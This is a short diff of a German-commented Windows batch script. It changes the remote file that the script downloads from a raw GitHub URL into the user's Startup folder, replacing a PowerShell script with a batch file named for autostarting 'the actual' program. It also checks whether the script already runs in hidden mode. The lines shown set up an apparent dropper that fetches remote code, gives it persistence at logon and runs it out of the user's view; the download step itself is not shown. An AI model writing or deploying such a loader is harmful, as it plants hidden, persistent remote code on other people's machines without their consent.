@@ -6,8 +6,8 @@
 
 :: Zielordner definieren
 set "zielordner=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "url=https://raw.githubusercontent.com/max65481/88/refs/heads/main/test.ps1"
-set "dateiname=test.ps1"
+set "url=https://raw.githubusercontent.com/max65481/88/refs/heads/main/Programm_welches_das_eigentliche_Autostartet.bat"
+set "dateiname=Programm_welches_das_eigentliche_Autostartet.bat"
 
 :: Prüfen, ob die Batch-Datei bereits versteckt läuft
 if "%1"=="hidden" goto hidden
